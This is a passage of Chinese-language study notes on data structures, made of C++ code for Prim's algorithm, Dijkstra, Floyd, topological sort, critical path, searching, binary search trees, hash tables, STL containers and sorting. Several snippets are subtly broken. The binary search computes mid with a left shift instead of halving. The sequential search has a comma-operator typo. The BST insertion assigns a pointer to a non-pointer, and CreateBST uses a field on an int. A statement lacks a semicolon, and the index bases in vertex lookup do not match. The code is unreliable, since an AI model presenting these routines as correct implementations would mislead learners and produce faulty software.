&#125;    PrintMST(mst, G.vexnum);    return 0;&#125;</code></pre><p><strong>Prim</strong></p><pre class="language-c++" data-language="c++"><code class="language-c++">#include&lt;bits&#x2F;stdc++.h&gt;using namespace std;#define INF 32366#define MAX_VERTICES 100typedef struct &#123;    int edges[MAX_VERTICES][MAX_VERTICES];    int edgeCount;    int vertexCount;&#125; Graph;void printMST(vector&lt;vector&lt;int&gt;&gt;&amp; mst, int n) &#123;    for(int i &#x3D; 1; i &lt;&#x3D; n; i++) &#123;        for(int j &#x3D; i + 1; j &lt;&#x3D; n; j++) &#123;            if(mst[i][j] &#x3D;&#x3D; 1) &#123;                cout &lt;&lt; i &lt;&lt; &quot; - &quot; &lt;&lt; j &lt;&lt; endl;            &#125;        &#125;    &#125;&#125;int main() &#123;    int n;    cin &gt;&gt; n;    Graph g;    g.edgeCount &#x3D; n - 1;    g.vertexCount &#x3D; n;    for (int i &#x3D; 1; i &lt;&#x3D; n; i++) &#123;        for(int j &#x3D; 1; j &lt;&#x3D; n; j++) &#123;            g.edges[i][j] &#x3D; INF;        &#125;    &#125;    for(int i &#x3D; 1; i &lt;&#x3D; n; i++) &#123;        int from, to, weight;        cin &gt;&gt; from &gt;&gt; to &gt;&gt; weight;        g.edges[from][to] &#x3D; weight;        g.edges[to][from] &#x3D; weight;    &#125;    vector&lt;bool&gt; visited(n + 1, false);    vector&lt;vector&lt;int&gt;&gt; mst(n + 1, vector&lt;int&gt;(n + 1, 0));    visited[1] &#x3D; true;    int mstEdgeCount &#x3D; 0;    while(mstEdgeCount &lt; n - 1) &#123;        int minWeight &#x3D; INF;        int minFrom &#x3D; -1;        int minTo &#x3D; -1;        for(int i &#x3D; 1; i &lt;&#x3D; n; i++) &#123;            if(visited[i]) &#123;                for(int j &#x3D; 1; j &lt;&#x3D; n; j++) &#123;                    if(!visited[j] &amp;&amp; g.edges[i][j] &lt; minWeight) &#123;                        minWeight &#x3D; g.edges[i][j];                        minFrom &#x3D; i;                        minTo &#x3D; j;                    &#125;                &#125;            &#125;        &#125;        if(minFrom &#x3D;&#x3D; -1) &#123;            cout &lt;&lt; &quot;Invalid.&quot; &lt;&lt; endl;            return 1;        &#125;        mst[minFrom][minTo] &#x3D; 1;        mst[minTo][minFrom] &#x3D; 1;        visited[minTo] &#x3D; true;        mstEdgeCount++;    &#125;    printMST(mst, n);    return 0;&#125;</code></pre><p><strong>最短路径</strong></p><p><strong>Dijkstra</strong></p><pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;bits&#x2F;stdc++.h&gt;using namespace std;#define MVNum 100#define INF 114154typedef struct&#123;    char vexs[MVNum];    int arcs[MVNum][MVNum];    int vexNum, arcNum;&#125; Graph;int LocateVex(const Graph &amp;G, char v)&#123;    for (int i &#x3D; 0; i &lt; G.vexNum; ++i)    &#123;        if (G.vexs[i] &#x3D;&#x3D; v)            return i;    &#125;    return -1;&#125;void Create(Graph &amp;G)&#123;    cin &gt;&gt; G.vexNum &gt;&gt; G.arcNum;    for (int i &#x3D; 1; i &lt;&#x3D; G.vexNum; i++)    &#123;        cin &gt;&gt; G.vexs[i];    &#125;    for (int i &#x3D; 1; i &lt;&#x3D; G.vexNum; i++)    &#123;        for(int j&#x3D;1;j&lt;&#x3D;G.vexNum;j++)        &#123;            G.arcs[i][j]&#x3D;INF;            if(i&#x3D;&#x3D;j)            &#123;                G.arcs[i][j]&#x3D;0;            &#125;        &#125;    &#125;    for (int k &#x3D; 1; k &lt;&#x3D; G.arcNum; k++)    &#123;        char v1, v2;        int w;        cin &gt;&gt; v1 &gt;&gt; v2 &gt;&gt; w;        int i &#x3D; LocateVex(G, v1);        int j &#x3D; LocateVex(G, v2);        if (i !&#x3D; -1 &amp;&amp; j !&#x3D; -1)        &#123;            G.arcs[i][j] &#x3D; w;        &#125;    &#125;&#125;void Dijkstra(Graph &amp;G, char start)&#123;    int v0 &#x3D; LocateVex(G,start);    int n &#x3D; G.vexNum;    vector&lt;int&gt; dist(n + 1, INF);    vector&lt;bool&gt; visited(n + 1, false);    vector&lt;int&gt; path(n + 1, -1);    dist[v0] &#x3D; 0;    for(int i &#x3D; 1; i &lt;&#x3D; n; i++) &#123;        int u &#x3D; -1;        int minDist &#x3D; INF;        for(int j &#x3D; 1; j &lt;&#x3D; n; j++) &#123;            if(!visited[j] &amp;&amp; dist[j] &lt; minDist) &#123;                u &#x3D; j;                minDist &#x3D; dist[j];            &#125;        &#125;        if(u &#x3D;&#x3D; -1) break;        visited[u] &#x3D; true;        for(int v &#x3D; 1; v &lt;&#x3D; n; v++) &#123;            if(!visited[v] &amp;&amp; G.arcs[u][v] !&#x3D; INF) &#123;                if(dist[u] + G.arcs[u][v] &lt; dist[v]) &#123;                    dist[v] &#x3D; dist[u] + G.arcs[u][v];                    path[v] &#x3D; u;  &#x2F;&#x2F; 记录路径                &#125;            &#125;        &#125;    &#125;    for(int i &#x3D; 1; i &lt;&#x3D; n; i++) &#123;        if(i !&#x3D; v0) &#123;            if(dist[i] &#x3D;&#x3D; INF) &#123;                cout &lt;&lt; &quot;Invalid.&quot; &lt;&lt; endl;            &#125; else &#123;                cout &lt;&lt; dist[i] &lt;&lt; endl;                cout &lt;&lt; start;                vector&lt;int&gt; route;                int k &#x3D; i;                while(k !&#x3D; -1) &#123;                    route.push_back(k);                    k &#x3D; path[k];                &#125;                for(int r &#x3D; route.size()-1; r &gt;&#x3D; 0; r--) &#123;                    cout &lt;&lt; &quot; -&gt; &quot; &lt;&lt; G.vexs[route[r]];                &#125;                cout &lt;&lt; endl;            &#125;        &#125;    &#125;&#125;int main()&#123;    Graph G;    Create(G);    char start;    cin &gt;&gt; start;    Dijkstra(G, start);    return 0;&#125;</code></pre><p><strong>Floyd</strong></p><pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;bits&#x2F;stdc++.h&gt;using namespace std;#define MVNum 100#define INF 114154typedef struct&#123;    char vexs[MVNum];    int arcs[MVNum][MVNum];    int vexNum, arcNum;&#125; Graph;int LocateVex(const Graph &amp;G, char v)&#123;    for (int i &#x3D; 0; i &lt; G.vexNum; ++i)    &#123;        if (G.vexs[i] &#x3D;&#x3D; v)            return i;    &#125;    return -1;&#125;void Create(Graph &amp;G)&#123;    cin &gt;&gt; G.vexNum &gt;&gt; G.arcNum;    for (int i &#x3D; 1; i &lt;&#x3D; G.vexNum; i++)    &#123;        cin &gt;&gt; G.vexs[i];    &#125;    for (int i &#x3D; 1; i &lt;&#x3D; G.vexNum; i++)    &#123;        for(int j&#x3D;1;j&lt;&#x3D;G.vexNum;j++)        &#123;            G.arcs[i][j]&#x3D;INF;            if(i&#x3D;&#x3D;j)            &#123;                G.arcs[i][j]&#x3D;0;            &#125;        &#125;    &#125;    for (int k &#x3D; 1; k &lt;&#x3D; G.arcNum; k++)    &#123;        char v1, v2;        int w;        cin &gt;&gt; v1 &gt;&gt; v2 &gt;&gt; w;        int i &#x3D; LocateVex(G, v1);        int j &#x3D; LocateVex(G, v2);        if (i !&#x3D; -1 &amp;&amp; j !&#x3D; -1)        &#123;            G.arcs[i][j] &#x3D; w;        &#125;    &#125;&#125;void Floyd(Graph &amp;G)&#123;    int n &#x3D; G.vexNum;    vector&lt;vector&lt;int&gt;&gt; dist(n + 1, vector&lt;int&gt;(n + 1));    vector&lt;vector&lt;int&gt;&gt; path(n + 1, vector&lt;int&gt;(n + 1, -1));    for(int i &#x3D; 1; i &lt;&#x3D; n; i++) &#123;        for(int j &#x3D; 1; j &lt;&#x3D; n; j++) &#123;            dist[i][j] &#x3D; G.arcs[i][j];            if(dist[i][j] &lt; INF &amp;&amp; i !&#x3D; j) &#123;                path[i][j] &#x3D; i;            &#125;        &#125;    &#125;    for(int k &#x3D; 1; k &lt;&#x3D; n; k++) &#123;        for(int i &#x3D; 1; i &lt;&#x3D; n; i++) &#123;            for(int j &#x3D; 1; j &lt;&#x3D; n; j++) &#123;                if(dist[i][k] !&#x3D; INF &amp;&amp; dist[k][j] !&#x3D; INF &amp;&amp;                   dist[i][k] + dist[k][j] &lt; dist[i][j]) &#123;                    dist[i][j] &#x3D; dist[i][k] + dist[k][j];                    path[i][j] &#x3D; path[k][j];                &#125;            &#125;        &#125;    &#125;    for(int i &#x3D; 1; i &lt;&#x3D; n; i++) &#123;        for(int j &#x3D; 1; j &lt;&#x3D; n; j++) &#123;            if(i !&#x3D; j) &#123;                cout &lt;&lt; G.vexs[i] &lt;&lt; &quot; &quot; &lt;&lt; G.vexs[j];                if(dist[i][j] &#x3D;&#x3D; INF) &#123;                    cout &lt;&lt; &quot;Invalid.&quot; &lt;&lt; endl;                &#125; else &#123;                    cout &lt;&lt; dist[i][j] &lt;&lt; endl;                    cout &lt;&lt; G.vexs[i];                    int k &#x3D; path[i][j];                    vector&lt;int&gt; route;                    while(k !&#x3D; -1) &#123;                        route.push_back(k);                        k &#x3D; path[i][k];                    &#125;                    for(int r &#x3D; route.size()-1; r &gt;&#x3D; 0; r--) &#123;                        cout &lt;&lt; &quot; -&gt; &quot; &lt;&lt; G.vexs[route[r]];                    &#125;                    cout &lt;&lt; &quot; -&gt; &quot; &lt;&lt; G.vexs[j] &lt;&lt; endl;                &#125;            &#125;        &#125;    &#125;&#125;int main()&#123;    Graph G;    Create(G);    Floyd(G);    return 0;&#125;</code></pre><p><strong>拓扑排序</strong></p><pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;bits&#x2F;stdc++.h&gt;using namespace std;#define MVNum 100typedef struct &#123;    char vexs[MVNum];    int arcs[MVNum][MVNum];    int vexNum, arcNum;&#125; Graph;int LocateVex(const Graph &amp;G, char v) &#123;    for (int i &#x3D; 0; i &lt; G.vexNum; ++i) &#123;        if (G.vexs[i] &#x3D;&#x3D; v)            return i;    &#125;    return -1;&#125;void CreateGraph(Graph &amp;G) &#123;    cin &gt;&gt; G.vexNum &gt;&gt; G.arcNum;    for (int i &#x3D; 0; i &lt; G.vexNum; i++) &#123;        cin &gt;&gt; G.vexs[i];    &#125;    for (int i &#x3D; 0; i &lt; G.vexNum; i++) &#123;        for (int j &#x3D; 0; j &lt; G.vexNum; j++) &#123;            G.arcs[i][j] &#x3D; 0;        &#125;    &#125;    for (int k &#x3D; 0; k &lt; G.arcNum; k++) &#123;        char v1, v2;        cin &gt;&gt; v1 &gt;&gt; v2;        int i &#x3D; LocateVex(G, v1);        int j &#x3D; LocateVex(G, v2);        if (i !&#x3D; -1 &amp;&amp; j !&#x3D; -1) &#123;            G.arcs[i][j] &#x3D; 1;  &#x2F;&#x2F; 有向图        &#125;    &#125;&#125;bool TopologicalSort(Graph &amp;G) &#123;    vector&lt;int&gt; inDegree(G.vexNum, 0);    for (int i &#x3D; 0; i &lt; G.vexNum; i++) &#123;        for (int j &#x3D; 0; j &lt; G.vexNum; j++) &#123;            if (G.arcs[j][i] &#x3D;&#x3D; 1) &#123;                inDegree[i]++;            &#125;        &#125;    &#125;    queue&lt;int&gt; q;    for (int i &#x3D; 0; i &lt; G.vexNum; i++) &#123;        if (inDegree[i] &#x3D;&#x3D; 0) &#123;            q.push(i);        &#125;    &#125;    int count &#x3D; 0;    vector&lt;char&gt; result;    while (!q.empty()) &#123;        int v &#x3D; q.front();        q.pop();        result.push_back(G.vexs[v]);        count++;        for (int i &#x3D; 0; i &lt; G.vexNum; i++) &#123;            if (G.arcs[v][i] &#x3D;&#x3D; 1) &#123;                inDegree[i]--;                if (inDegree[i] &#x3D;&#x3D; 0) &#123;                    q.push(i);                &#125;            &#125;        &#125;    &#125;    if (count &#x3D;&#x3D; G.vexNum) &#123;        for (char c : result) &#123;            cout &lt;&lt; c &lt;&lt; &quot; &quot;;        &#125;        cout &lt;&lt; endl;        return true;    &#125; else &#123;        return false;    &#125;&#125;int main() &#123;    Graph G;    CreateGraph(G);    TopologicalSort(G);    return 0;&#125;</code></pre><p><strong>关键路径</strong></p><pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;bits&#x2F;stdc++.h&gt;using namespace std;#define MVNum 100#define INF 114154typedef struct &#123;    char vexs[MVNum];    int arcs[MVNum][MVNum];    int vexNum, arcNum;&#125; Graph;int LocateVex(const Graph &amp;G, char v) &#123;    for (int i &#x3D; 0; i &lt; G.vexNum; ++i) &#123;        if (G.vexs[i] &#x3D;&#x3D; v)            return i;    &#125;    return -1;&#125;void CreateGraph(Graph &amp;G) &#123;    cin &gt;&gt; G.vexNum &gt;&gt; G.arcNum;    for (int i &#x3D; 0; i &lt; G.vexNum; i++) &#123;        cin &gt;&gt; G.vexs[i];    &#125;    for (int i &#x3D; 0; i &lt; G.vexNum; i++) &#123;        for (int j &#x3D; 0; j &lt; G.vexNum; j++) &#123;            G.arcs[i][j] &#x3D; 0;        &#125;    &#125;    for (int k &#x3D; 0; k &lt; G.arcNum; k++) &#123;        char v1, v2;        int w;        cin &gt;&gt; v1 &gt;&gt; v2 &gt;&gt; w;        int i &#x3D; LocateVex(G, v1);        int j &#x3D; LocateVex(G, v2);        if (i !&#x3D; -1 &amp;&amp; j !&#x3D; -1) &#123;            G.arcs[i][j] &#x3D; w;        &#125;    &#125;&#125;bool TopologicalSort(Graph &amp;G, vector&lt;int&gt; &amp;topoOrder) &#123;    vector&lt;int&gt; inDegree(G.vexNum, 0);    for (int i &#x3D; 0; i &lt; G.vexNum; i++) &#123;        for (int j &#x3D; 0; j &lt; G.vexNum; j++) &#123;            if (G.arcs[j][i] !&#x3D; 0) &#123;                inDegree[i]++;            &#125;        &#125;    &#125;    queue&lt;int&gt; q;    for (int i &#x3D; 0; i &lt; G.vexNum; i++) &#123;        if (inDegree[i] &#x3D;&#x3D; 0) &#123;            q.push(i);        &#125;    &#125;    while (!q.empty()) &#123;        int v &#x3D; q.front();        q.pop();        topoOrder.push_back(v);        for (int i &#x3D; 0; i &lt; G.vexNum; i++) &#123;            if (G.arcs[v][i] !&#x3D; 0) &#123;                inDegree[i]--;                if (inDegree[i] &#x3D;&#x3D; 0) &#123;                    q.push(i);                &#125;            &#125;        &#125;    &#125;    return topoOrder.size() &#x3D;&#x3D; G.vexNum;&#125;void CalculateVE(Graph &amp;G, const vector&lt;int&gt; &amp;topoOrder, vector&lt;int&gt; &amp;ve) &#123;    &#x2F;&#x2F; 初始化ve数组    ve.resize(G.vexNum, 0);    &#x2F;&#x2F; 按拓扑顺序计算ve    for (int i &#x3D; 0; i &lt; topoOrder.size(); i++) &#123;        int u &#x3D; topoOrder[i];        for (int v &#x3D; 0; v &lt; G.vexNum; v++) &#123;            if (G.arcs[u][v] !&#x3D; 0) &#123;                ve[v] &#x3D; max(ve[v], ve[u] + G.arcs[u][v]);            &#125;        &#125;    &#125;&#125;void CalculateVL(Graph &amp;G, const vector&lt;int&gt; &amp;topoOrder, const vector&lt;int&gt; &amp;ve, vector&lt;int&gt; &amp;vl) &#123;    &#x2F;&#x2F; 初始化vl数组    vl.resize(G.vexNum, ve[topoOrder.back()]);    &#x2F;&#x2F; 按逆拓扑顺序计算vl    for (int i &#x3D; topoOrder.size() - 1; i &gt;&#x3D; 0; i--) &#123;        int u &#x3D; topoOrder[i];        for (int v &#x3D; 0; v &lt; G.vexNum; v++) &#123;            if (G.arcs[u][v] !&#x3D; 0) &#123;                vl[u] &#x3D; min(vl[u], vl[v] - G.arcs[u][v]);            &#125;        &#125;    &#125;&#125;void FindCriticalPath(Graph &amp;G, const vector&lt;int&gt; &amp;ve, const vector&lt;int&gt; &amp;vl) &#123;    for (int i &#x3D; 0; i &lt; G.vexNum; i++) &#123;        for (int j &#x3D; 0; j &lt; G.vexNum; j++) &#123;            if (G.arcs[i][j] !&#x3D; 0) &#123;                int e &#x3D; ve[i];  &#x2F;&#x2F; 活动最早开始时间                int l &#x3D; vl[j] - G.arcs[i][j];  &#x2F;&#x2F; 活动最晚开始时间                if (e &#x3D;&#x3D; l) &#123;  &#x2F;&#x2F; 关键活动                    cout &lt;&lt; G.vexs[i] &lt;&lt; &quot; &quot; &lt;&lt; G.vexs[j] &lt;&lt; &quot; &quot; &lt;&lt; G.arcs[i][j] &lt;&lt; endl;                &#125;            &#125;        &#125;    &#125;&#125;int main() &#123;    Graph G;    CreateGraph(G);    vector&lt;int&gt; topoOrder;    if (!TopologicalSort(G, topoOrder)) &#123;        cout &lt;&lt; &quot;ERROR&quot; &lt;&lt; endl;        return 0;    &#125;    vector&lt;int&gt; ve, vl;    CalculateVE(G, topoOrder, ve);    CalculateVL(G, topoOrder, ve, vl);    FindCriticalPath(G, ve, vl);    return 0;&#125;</code></pre><h3 id="查找">查找</h3><h4 id="线性表-1">线性表</h4><p><strong>顺序查找</strong></p><pre class="language-c++" data-language="c++"><code class="language-c++">typedef struct&#123;    KeyType key;    InfoType otherinfo;&#125;ElemType;typedef struct&#123;    ElemType *R;    int length;&#125;SSTable;int Search_Seq(SSTable ST,KeyType key)&#123;    for(int i&#x3D;ST.length;i&gt;&#x3D;1;i--)&#123;        if(ST.R[i],key&#x3D;&#x3D;key)&#123;            return i;        &#125;    &#125;    return 0;&#125;</code></pre><p><strong>二分查找</strong></p><pre class="language-c++" data-language="c++"><code class="language-c++">typedef struct&#123;    KeyType key;    InfoType otherinfo;&#125;ElemType;typedef struct&#123;    ElemType *R;    int length;&#125;SSTable;int Search_Bin(SSTable ST,KeyType key)&#123;    int low &#x3D; 1;    int high &#x3D; ST.length;    while(low&lt;&#x3D;high)&#123;        int mid &#x3D; (low+high) &lt;&lt; 1;        if(key&#x3D;&#x3D;ST.R[mid].key)&#123;            return mid;        &#125;        else if(key&lt;ST.R[mid].key)&#123;            high &#x3D; mid - 1;        &#125;        else&#123;            low &#x3D; mid + 1;        &#125;    &#125;    return 0;&#125;</code></pre><p><strong>分块查找</strong></p><pre class="language-c++" data-language="c++"><code class="language-c++">typedef struct&#123;    KeyType key;    InfoType otherinfo;&#125;ElemType;typedef struct&#123;    ElemType *R;    int length;&#125;SSTable;typedef struct &#123;    KeyType max_key; &#x2F;&#x2F; 块内最大关键字    int start;       &#x2F;&#x2F; 块起始位置    int end;         &#x2F;&#x2F; 块结束位置&#125; IndexBlock;int BlockSearch(SSTable ST, IndexBlock index[], int index_len, KeyType key) &#123;    int low &#x3D; 0, high &#x3D; index_len - 1;    int block_idx &#x3D; -1;    &#x2F;&#x2F; 二分查找确定所在块    while (low &lt;&#x3D; high) &#123;        int mid &#x3D; (low + high) &#x2F; 2;        if (key &lt;&#x3D; index[mid].max_key) &#123;            block_idx &#x3D; mid;            high &#x3D; mid - 1;        &#125; else &#123;            low &#x3D; mid + 1;        &#125;    &#125;    if (block_idx &#x3D;&#x3D; -1)        return -1;    &#x2F;&#x2F; 在块内顺序查找    for (int i &#x3D; index[block_idx].start; i &lt;&#x3D; index[block_idx].end; ++i) &#123;        if (ST.R[i].key &#x3D;&#x3D; key)            return i;    &#125;    return -1;&#125;</code></pre><h4 id="树表">树表</h4><p><strong>二叉排序树</strong></p><pre class="language-c++" data-language="c++"><code class="language-c++">typedef struct&#123;    KeyType key;    InfoType otherinfo;&#125;ElemType;typedef struct BSTNode&#123;    ElemType data;    struct BSTNode *lchild,*rchild;&#125;BSTNode,*BSTree;BSTree SearchBST(BSTree T,KeyType key)&#123;    if(!T || key&#x3D;&#x3D;T-&gt;data.key)&#123;        return T;    &#125;    else if(key&lt;T-&gt;data.key)&#123;        return SearchBST(T-&gt;lchild,key);    &#125;    else&#123;        return SearchBST(T-&gt;rchild,key);    &#125;&#125;void InsertBST(BSTree &amp;T,ElemType e)&#123;    if(!T)&#123;        BSTNode S &#x3D; new BSTNode;        S-&gt;data &#x3D; e;        S-&gt;lchild &#x3D; NULL;        S-&gt;rchild &#x3D; NULL;        T &#x3D; S;    &#125;    else if(e.key&lt;T-&gt;data.key)&#123;        InsertBST(T-&gt;lchild,e);    &#125;    else if(e.key&gt;T-&gt;data.key)&#123;        InsertBST(T-&gt;rchild,e);    &#125;&#125;void CreateBST(BSTree &amp;T)&#123;    int e;    T &#x3D; NULL;    cin &gt;&gt; e;    while(e.key!&#x3D;-1)&#123;        InsertBST(T,e);        cin &gt;&gt; e;    &#125;&#125;void DeleteBST(BSTree &amp;T, KeyType key) &#123;    BSTree p &#x3D; T;      &#x2F;&#x2F; 当前节点指针    BSTree f &#x3D; NULL;   &#x2F;&#x2F; 父节点指针    &#x2F;&#x2F; 查找删除节点    while (p) &#123;        if (p-&gt;data.key &#x3D;&#x3D; key) break;        f &#x3D; p;        if (p-&gt;data.key &gt; key) p &#x3D; p-&gt;lchild;        else p &#x3D; p-&gt;rchild;    &#125;    if (!p) return;    BSTree q &#x3D; p;      &#x2F;&#x2F; 辅助指针 q 指向待删除节点    &#x2F;&#x2F; Case 1: 节点 p 是叶子节点或仅有一个子树    if (!p-&gt;lchild) &#123;        &#x2F;&#x2F; 左子树为空，用右子树替换        if (!f) T &#x3D; p-&gt;rchild;              &#x2F;&#x2F; p 是根节点        else if (f-&gt;lchild &#x3D;&#x3D; p) f-&gt;lchild &#x3D; p-&gt;rchild;        else f-&gt;rchild &#x3D; p-&gt;rchild;        free(q);    &#125; else if (!p-&gt;rchild) &#123; &#x2F;&#x2F; 右子树为空，用左子树替换        if (!f) T &#x3D; p-&gt;lchild;              &#x2F;&#x2F; p 是根节点        else if (f-&gt;lchild &#x3D;&#x3D; p) f-&gt;lchild &#x3D; p-&gt;lchild;        else f-&gt;rchild &#x3D; p-&gt;lchild;        free(q);    &#125; else &#123;        &#x2F;&#x2F; Case 2: 节点 p 有两个子树，找左子树的最右节点（前驱）        BSTree s &#x3D; p-&gt;lchild;        BSTree parent_s &#x3D; p; &#x2F;&#x2F; s 的父节点        while (s-&gt;rchild) &#123;            parent_s &#x3D; s;            s &#x3D; s-&gt;rchild;        &#125;        &#x2F;&#x2F; 用前驱 s 替换 p 的值        p-&gt;data &#x3D; s-&gt;data;        &#x2F;&#x2F; 删除前驱节点 s（此时 s 至多有一个左子树）        if (parent_s &#x3D;&#x3D; p) parent_s-&gt;lchild &#x3D; s-&gt;lchild;        else parent_s-&gt;rchild &#x3D; s-&gt;lchild;        free(s);    &#125;&#125;</code></pre><h4 id="哈希表">哈希表</h4><pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;list&gt;#include &lt;string&gt;using namespace std;&#x2F;&#x2F; 拉链法static const int tableSize &#x3D; 10;vector&lt;list&lt;pair&lt;int, string&gt;&gt;&gt; chainTable(tableSize);int hashFunction(int key)&#123;    return key % tableSize;&#125;void insertChaining(int key, string value)&#123;    int index &#x3D; hashFunction(key);    chainTable[index].push_back(make_pair(key, value));&#125;string searchChaining(int key)&#123;    int index &#x3D; hashFunction(key);    for (auto &amp;p : chainTable[index])    &#123;        if (p.first &#x3D;&#x3D; key)            return p.second;    &#125;    return &quot;&quot;;&#125;void removeChaining(int key)&#123;    int index &#x3D; hashFunction(key);    auto &amp;chain &#x3D; chainTable[index];    for (auto it &#x3D; chain.begin(); it !&#x3D; chain.end(); ++it)    &#123;        if (it-&gt;first &#x3D;&#x3D; key)        &#123;            chain.erase(it);            return;        &#125;    &#125;&#125;&#x2F;&#x2F; 开放定址法（以线性探测为例）enum EntryState &#123; EMPTY, OCCUPIED, DELETED &#125;;struct HashEntry &#123;    int key;    string value;    EntryState state;&#125;;vector&lt;HashEntry&gt; openTable(tableSize, &#123;0, &quot;&quot;, EMPTY&#125;);int hashFunctionLP(int key)&#123;    return key % tableSize;&#125;void insertLinear(int key, string value)&#123;    int idx &#x3D; hashFunctionLP(key);    for (int i &#x3D; 0; i &lt; tableSize; ++i)    &#123;        int probe &#x3D; (idx + i) % tableSize;        if (openTable[probe].state &#x3D;&#x3D; EMPTY || openTable[probe].state &#x3D;&#x3D; DELETED)        &#123;            openTable[probe].key &#x3D; key;            openTable[probe].value &#x3D; value;            openTable[probe].state &#x3D; OCCUPIED;            return;        &#125;    &#125;&#125;string searchLinear(int key)&#123;    int idx &#x3D; hashFunctionLP(key);    for (int i &#x3D; 0; i &lt; tableSize; ++i)    &#123;        int probe &#x3D; (idx + i) % tableSize;        if (openTable[probe].state &#x3D;&#x3D; EMPTY)            return &quot;&quot;;        if (openTable[probe].state &#x3D;&#x3D; OCCUPIED &amp;&amp; openTable[probe].key &#x3D;&#x3D; key)            return openTable[probe].value;    &#125;    return &quot;&quot;;&#125;void removeLinear(int key)&#123;    int idx &#x3D; hashFunctionLP(key);    for (int i &#x3D; 0; i &lt; tableSize; ++i)    &#123;        int probe &#x3D; (idx + i) % tableSize;        if (openTable[probe].state &#x3D;&#x3D; EMPTY)            return;        if (openTable[probe].state &#x3D;&#x3D; OCCUPIED &amp;&amp; openTable[probe].key &#x3D;&#x3D; key)        &#123;            openTable[probe].state &#x3D; DELETED;            return;        &#125;    &#125;&#125;</code></pre><h4 id="stl-5">STL</h4><p><strong>unordered_set</strong></p><ul><li><code>insert(x)</code> 向集合中插入元素 x（若已存在，则不插入）</li><li><code>erase(x)</code> 从集合中删除元素 x</li><li><code>find(x)</code> 查找元素 x，返回迭代器；若未找到，返回<code>end()</code></li><li><code>count(x)</code> 统计元素 x 在集合中出现的次数（要么 0，要么1）</li><li><code>size()</code> 查询集合中元素数量</li><li><code>empty()</code> 判断集合是否为空</li><li><code>clear()</code> 清空集合中的所有元素</li></ul><pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;#include &lt;unordered_set&gt;using namespace std;int main()&#123;    unordered_set&lt;int&gt; us;    us.insert(3);    us.insert(1);    us.insert(4)    us.insert(1);    cout &lt;&lt; us.size() &lt;&lt; endl;    cout &lt;&lt; (us.find(2) !&#x3D; us.end()) &lt;&lt; endl;    cout &lt;&lt; us.count(1) &lt;&lt; endl;    us.erase(3);    us.clear();    cout &lt;&lt; us.empty() &lt;&lt; endl;&#125;</code></pre><p><strong>unordered_map</strong></p><ul><li><code>insert({k, v})</code> 向映射中插入键值对<code>(k, v)</code>（若键已存在，不插入）</li><li><code>erase(k)</code> 删除键为 k 的元素</li><li><code>find(k)</code> 查找键为 k的元素，返回指向该元素的迭代器；若未找到，返回 <code>end()</code></li><li><code>count(k)</code> 统计键 k 在映射中出现的次数（要么 0，要么1）</li><li><code>operator[](k)</code> 如果键 k存在，返回对应的值；否则插入一个键为k、值为默认构造的元素并返回其引用</li><li><code>size()</code> 查询映射中元素数量</li><li><code>empty()</code> 判断映射是否为空</li><li><code>clear()</code> 清空映射中的所有元素</li></ul><pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;#include &lt;unordered_map&gt;using namespace std;int main()&#123;    unordered_map&lt;string, int&gt; um;    um.insert(&#123;&quot;apple&quot;, 3&#125;);    um.insert(make_pair(&quot;banana&quot;, 5));    um[&quot;cherry&quot;] &#x3D; 2;    cout &lt;&lt; um.size() &lt;&lt; endl;    cout &lt;&lt; um[&quot;cherry&quot;] &lt;&lt; endl;    auto it &#x3D; um.find(&quot;banana&quot;);    if (it !&#x3D; um.end()) &#123;        cout &lt;&lt; it-&gt;second &lt;&lt; endl;    &#125;    um.erase(&quot;apple&quot;);    um.clear();    cout &lt;&lt; um.empty() &lt;&lt; endl;&#125;</code></pre><h3 id="排序">排序</h3><p><strong>插入排序</strong></p><pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;using namespace std;typedef struct&#123;    int *r;    int length;&#125; SqList;void InsertSort(SqList &amp;L)&#123;    for (int i &#x3D; 1; i &lt; L.length; i++)    &#123;        int temp &#x3D; L.r[i];        int j &#x3D; i - 1;        while (j &gt;&#x3D; 0 &amp;&amp; L.r[j] &gt; temp)        &#123;            L.r[j + 1] &#x3D; L.r[j];            j--;        &#125;        L.r[j + 1] &#x3D; temp;    &#125;&#125;&#x2F;&#x2F; 二分查找插入位置void BinaryInsertSort(SqList &amp;L)&#123;    for (int i &#x3D; 1; i &lt; L.length; i++)    &#123;        int temp &#x3D; L.r[i];        int start &#x3D; 0;        int end &#x3D; i - 1;        while (start &lt;&#x3D; end)        &#123;            int mid &#x3D; (start + end) &#x2F; 2;            if (L.r[mid] &gt; temp)            &#123;                end &#x3D; mid - 1;            &#125;            else            &#123;                start &#x3D; mid + 1;            &#125;        &#125;        for (int j &#x3D; i - 1; j &gt;&#x3D; start; j--)        &#123;            L.r[j + 1] &#x3D; L.r[j];        &#125;        L.r[start] &#x3D; temp;    &#125;&#125;</code></pre><p><strong>希尔排序</strong></p><pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;using namespace std;#define MAXSIZE 100typedef struct&#123;    int data[MAXSIZE];    int length;&#125; Sqlist;void ShellSort(Sqlist &amp;L)&#123;    &#x2F;&#x2F; 初始间隔（gap）为长度的一半，逐步缩小间隔直到1    for (int gap &#x3D; L.length &#x2F; 2; gap &gt; 0; gap &#x2F;&#x3D; 2)    &#123;        &#x2F;&#x2F; 对每个子序列进行插入排序        for (int i &#x3D; gap; i &lt; L.length; i++)        &#123;            int temp &#x3D; L.data[i];            int j;            for (j &#x3D; i; j &gt;&#x3D; gap &amp;&amp; L.data[j - gap] &gt; temp; j -&#x3D; gap)            &#123;                L.data[j] &#x3D; L.data[j - gap];            &#125;            L.data[j] &#x3D; temp;        &#125;    &#125;&#125;</code></pre><p><strong>冒泡排序</strong></p><pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;using namespace std;#define MAXSIZE 100typedef struct&#123;    int data[MAXSIZE];    int length;&#125; Sqlist;void bubble(Sqlist &amp;L)&#123;    for (int i &#x3D; L.length - 1; i &gt; 0; i--)    &#123;        for (int j &#x3D; 0; j &lt; i; j++)        &#123;            if (L.data[j] &gt; L.data[j + 1])            &#123;                swap(L.data[j], L.data[j + 1]);            &#125;        &#125;    &#125;&#125;</code></pre><p><strong>快速排序</strong></p><pre 